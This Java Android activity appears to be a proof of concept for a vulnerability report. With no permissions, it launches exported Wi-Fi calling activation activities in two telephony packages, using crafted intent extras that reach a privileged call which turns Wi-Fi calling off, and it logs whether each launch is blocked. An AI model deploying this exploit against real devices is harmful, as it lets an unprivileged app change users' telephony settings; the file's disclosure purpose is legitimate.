package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

/**
 * Zero-permission probe for com.android.imsserviceentitlement.WfcActivationActivity
 * vs. its sibling WfcQnsActivationActivity.
 *
 * WfcActivationActivity is exported with NO permission, yet its controller can reach
 * ImsUtils.turnOffWfc() -> ImsMmTelManager.setVoWiFiSettingEnabled(false), a privileged
 * telephony mutation. Its sibling WfcQnsActivationActivity requires MODIFY_PHONE_STATE.
 * This activity launches both from a zero-perm attacker context to prove the asymmetry.
 */
public class WfcActivationProbeActivity extends Activity {
    private static final String TAG = "VRP-WfcProbe";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        int fakeSubId = getIntent().getIntExtra("subId", 1);

        // 1) Launch the UNPROTECTED sibling with attacker-controlled subId + launch intention.
        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName(
                    "com.android.imsserviceentitlement",
                    "com.android.imsserviceentitlement.WfcActivationActivity"));
            i.putExtra("android.telephony.extra.SUBSCRIPTION_INDEX", fakeSubId);
            // Any value != 0 routes into handleEntitlementStatusForUpdating(), which
            // contains the mImsUtils.turnOffWfc() sink on incompatible()/serverDataMissing().
            i.putExtra("EXTRA_LAUNCH_CARRIER_APP", 1);
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            Log.i(TAG, "WfcActivationActivity: startActivity() returned normally (no SecurityException) subId=" + fakeSubId);
        } catch (SecurityException e) {
            Log.e(TAG, "WfcActivationActivity: BLOCKED by SecurityException: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "WfcActivationActivity: other exception: " + e);
        }

        // 2) Launch the PROPERLY-GATED sibling the same way, to confirm it is denied.
        try {
            Intent i2 = new Intent();
            i2.setComponent(new ComponentName(
                    "com.android.imsserviceentitlement",
                    "com.android.imsserviceentitlement.WfcQnsActivationActivity"));
            i2.putExtra("android.telephony.extra.SUBSCRIPTION_INDEX", fakeSubId);
            i2.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i2);
            Log.i(TAG, "WfcQnsActivationActivity: startActivity() returned normally (UNEXPECTED - should require MODIFY_PHONE_STATE)");
        } catch (SecurityException e) {
            Log.e(TAG, "WfcQnsActivationActivity: correctly BLOCKED by SecurityException: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "WfcQnsActivationActivity: other exception: " + e);
        }

        // 3) Same class of bug in a SEPARATE, higher-privileged package:
        // com.google.android.wfcactivation (holds MODIFY_PHONE_STATE, WRITE_APN_SETTINGS,
        // WRITE_SETTINGS, READ_PRIVILEGED_PHONE_STATE itself). Its WfcActivationActivity is
        // exported with NO permission and reaches the identical ImsUtils.disableAndResetVoWiFiImsSettings()
        // -> ImsMmTelManager.setVoWiFiSettingEnabled(false) sink.
        try {
            Intent i3 = new Intent();
            i3.setComponent(new ComponentName(
                    "com.google.android.wfcactivation",
                    "com.google.android.wfcactivation.WfcActivationActivity"));
            i3.putExtra("android.telephony.extra.SUBSCRIPTION_INDEX", fakeSubId);
            i3.putExtra("EXTRA_LAUNCH_CARRIER_APP", 1);
            i3.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i3);
            Log.i(TAG, "google.wfcactivation.WfcActivationActivity: startActivity() returned normally (no SecurityException) subId=" + fakeSubId);
        } catch (SecurityException e) {
            Log.e(TAG, "google.wfcactivation.WfcActivationActivity: BLOCKED by SecurityException: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "google.wfcactivation.WfcActivationActivity: other exception: " + e);
        }

        finish();
    }
}
